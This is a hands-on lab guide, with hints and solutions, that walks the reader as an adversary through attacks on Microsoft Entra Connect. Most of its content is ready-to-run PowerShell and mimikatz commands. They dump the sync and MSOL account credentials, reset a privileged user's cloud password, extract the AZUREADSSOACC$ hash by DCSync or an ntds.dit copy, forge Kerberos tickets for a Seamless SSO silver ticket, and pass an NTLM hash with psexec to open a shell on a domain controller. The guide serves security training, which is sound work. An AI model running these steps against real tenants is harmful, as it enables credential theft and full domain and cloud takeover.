# Lab 2 - Entra Connect Attacks
### Preparations
#### Prepare a victim user with high privileges:
in [Entra porta](https://entra.microsoft.com/#view/Microsoft_AAD_UsersAndTenants/UserManagementMenuBlade/~/AllUsers/menuId/) (login with your admin tenant creds), select ***user1*** and assign it with the **Active** (not *Eligible*) **Application Administrator** role



# Instructions
From this point on you act as the adversary, without knowing the Entra / AD Creds, you have code execution as Administrator on the Entra Connect server (in our case- it's the DC VM), and you know the Entra tenant domain.

Don't go so fast for the solution.. **try first!**

# Start 

### 1. Reconnaissance
Using AADInternals, do a bit of recon to find out the the tenant ID, and if the tenant has Seamless SSO turned on..

Hint: use https://aadinternals.com/aadinternals

<details>
<summary><b>Solution</b></summary>

```powershell
Import-Module AADInternals
Invoke-AADIntReconAsOutsider -DomainName YOURDOMAIN.onmicrosoft.com
```
</details>


### 2. Dumping and Extracting Entra Connect credentials:
Now that you've got basic info, get the credentials of the Sync and MSOL accounts.

<details>
<summary><b>Solution</b></summary>

Execute in powershell:

```powershell
Get-AADIntSyncCredentials
```
keep the creds aside :)
</details>

### 3. Finding a target (victim) user to attack
So far you've obtained:
1. Tenant ID + domain
2. Sync_xx account credentials

In order to move laterally to the cloud, we should find a synced user that we can take over...


<details>
<summary><b>Hint 1</b></summary>

See which users are Active Directory users that are synced to the cloud...
</details>

<details>
<summary><b>Hint 2</b></summary>

Go the easier way:
* Use AzureAD Powershell module (https://learn.microsoft.com/en-us/powershell/module/azuread/?view=azureadps-2.0)

Go the advanced way (and learn how to use access tokens):
1. Use AADInternals to get an access token for AAD Graph
2. Use AzureAD Powershell module and connect using this token (https://learn.microsoft.com/en-us/powershell/module/azuread/?view=azureadps-2.0)


</details>

<details>
<summary><b>Hint 3</b></summary>

Advanced way commands:
1. ```Get-AADIntAccessTokenForAADGraph```
1. ```Connect-AzureAD -AccountId $SyncUserUPN -TenantId $tenantId -AadAccessToken $at```

if you went the easy way - figure it out yourself.
</details>

<details>
<summary><b>Hint 4</b></summary>

Using AzureAD Powershell module, list the users, and try to see which one has a powerful role..
</details>


<details>
<summary><b>Solution</b></summary>

Login using dumped Sync_XX account:
```powershell
# Prompt for credentials and retrieve & store access token to cache
# Enter your dumped Sync_XX account creds!
$tenantId = "YOUR_TENANT_ID"
$at = Get-AADIntAccessTokenForAADGraph

# method 1: 
$userUPN = "Sync_xxx@YOURDOMAIN.onmicrosoft.com" # change the username
Connect-AzureAD -AccountId $userUPN -TenantId $tenantId -AadAccessToken $at

# method 2:
Connect-AzureAD -AadAccessToken $at -TenantId $tenantId -AccountId "1b730954-1685-4b74-9bfd-dac224a7b894" # "Azure Active Directory PowerShell" app id,
```

Enumerate users:
```powershell
# this is just a fancy, oneliner script to list on-premise, synced users with their roles
$onpremSyncedUsers = Get-AzureADUser -All $true | Where-Object { 
    $_.OnPremisesSecurityIdentifier -ne $null 
} 
$onpremSyncedUsers | ForEach-Object { 
    $user = $_; 
    Get-AzureADDirectoryRole | ForEach-Object { 
        $role = $_;
        Get-AzureADDirectoryRoleMember -ObjectId $role.ObjectId | Where-Object { $_.ObjectId -eq $user.ObjectId } | Select-Object @{Name='UserPrincipalName';Expression={$user.UserPrincipalName}}, @{Name='OnPremisesSecurityIdentifier';Expression={$user.OnPremisesSecurityIdentifier}}, @{Name='ImmutableId';Expression={$user.ImmutableId}}, @{Name='Role';Expression={$role.DisplayName}} 
    } 
} | Format-Table -Wrap -AutoSize
```

Did you find it? should be ```user1```.
</details>


### 4. Reset Password Attack
#### Reset the victim user's Entra password

<details>
<summary><b>Hint 1</b></summary>

Using AADInternals, reset that user's password and then login on its behalf.
</details>

<details>
<summary><b>Hint 2</b></summary>

Use Set-AADIntUserPassword command
</details>

<details>
<summary><b>Solution</b></summary>

```powershell
Set-AADIntUserPassword -SourceAnchor "IMMUTABLE_ID" -Password "MYPASS" -Verbose
```
Now, open https://entra.microsoft.com in the browser **in incognito** and login as that user *VICTIM_USER@YOURDOMAIN.onmicrosoft.com* with the new password :)


*This method does not bypass MFA
</details>


#
### 5. Silver Ticket (Seamless SSO) Attack

Set the domain:
```powershell
$domain = "MYDOMAIN" # change to your domain name WITHOUT the ".onmicrosoft.com" part 
```

#### 1. Get AZUREADSSOACC computer account's hash:
```powershell
# Option 1: Get-ADReplAccount
Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain $domain -Server dcvm # take the "NTHash" part

# Option 2: mimikatz
mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$"
    
# Option 3: Dump NTDS.dit and registry:
ntdsutil "ac i ntds" "ifm” "create full C:\temp" q q # Now the AD and registry are dumped to C:\temp and we can extract the password hash using DSInternals.
Import-Module DSInternals
$key = Get-BootKey -SystemHivePath 'C:\temp\registry\SYSTEM'
(Get-ADDBAccount -SamAccountName 'AZUREADSSOACC$' -DBPath 'C:\temp\Active Directory\ntds.dit' -BootKey $key).NTHash | Format-Hex # Get the password's hash of AZUREADSSOACC
# remote the empty spaces and keep the hash
```

Set the hash:
```powershell
$hash = "CHANGEME"
```
#### 2. Find victim user to impersonate

```powershell
# Option 1: query Entra + get roles
Import-Module AzureAD
Connect-AzureAD # use the dumped Entra Connect creds (Sync_XXX account)


# Option 2: query AD (w/o getting Entra roles)
Get-ADReplAccount -SamAccountName 'VICTIM_USER' -Domain $domain -Server dcvm # take the "Sid:" part
```

Set the victim user's SID:
```powershell
$victimUserSid = "S-1-5-21-CHANGEME" # set the sid of the user you wish to impersonate
```

#### 3. Perform the attack
```powershell
# generate kerberos ticket
$kerberos=New-AADIntKerberosTicket -SidString $victimUserSid -Hash $hash

# get an access token for that user
$at = Get-AADIntAccessTokenForMSGraph -KerberosTicket $kerberos -Domain $domain".onmicrosoft.com"
# if you get AADSTS50079 error, it might mean you have a conditional access policy in your Entra tenant named "Security info registration for Microsoft partners and vendors" that blocks this login, you need to reinstall the entire lab from scratch and associate it yo your new tenant

# start exploring what you can do in the tenant using MS Graph API!
$MaximumFunctionCount = 8192 # bypass powershell's scope memory limit
Import-Module Microsoft.Graph.Users
$securedAT = ConvertTo-SecureString $at -AsPlainText -Force
Connect-MgGraph -AccessToken $securedAT

Get-MgContext

Get-MgUser
#SDK Docs: https://aka.ms/graph/sdk/powershell/docs
```
if you took the easy way earlier, take the hard one now!


#
### 6. Pass The Hash using Entra Connect's MSOL Account Attack

Your goal: using the MSOL account creds, perform pass the hash attack, and open cmd.exe on DC VM, using another domain admin user (that is *not* ``user1``). Do it from **Win 11 VM**.

* Use ``c:\lab\mimikatz`` and [impacket-psexec](https://github.com/ropnop/impacket_static_binaries/releases/download/0.9.22.dev-binaries/psexec_windows.exe)

<details>
<summary><b>Solution</b></summary>

```powershell

# find a domain admin user to target
Get-ADGroupMember 'domain admins' | select name,samaccountname

# login in the context of MSOL account
runas /user:YOUDOMAIN\MSOL_xxxxxx cmd.exe

# dump rootuser's hash
C:\lab\mimikatz\x64\mimikatz.exe "lsadump::dcsync /user:rootuser"

# from a new cmd:

.\psexec_windows.exe -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> YOUDOMAIN/rootuser@10.0.0.10 cmd

ipconfig # see the IP is of DC VM

```
</details>


#
###  Good Job! Summarize yourself the attack paths you just took and the attacks you've learned!